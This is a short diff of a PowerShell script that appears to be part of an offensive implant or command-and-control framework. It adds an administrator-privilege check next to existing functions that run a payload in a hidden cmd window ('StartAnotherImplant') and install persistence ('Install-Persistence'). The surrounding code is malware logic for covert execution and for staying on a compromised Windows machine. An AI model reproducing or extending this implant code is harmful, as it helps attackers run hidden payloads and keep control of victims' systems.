@@ -32,6 +32,11 @@ Function StartAnotherImplant {
         start-process -windowstyle hidden cmd -args "/c $payload"
     }
 }
+function Test-Administrator  
+{  
+    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+}
 Function Install-Persistence
 {
     Param ($Method)
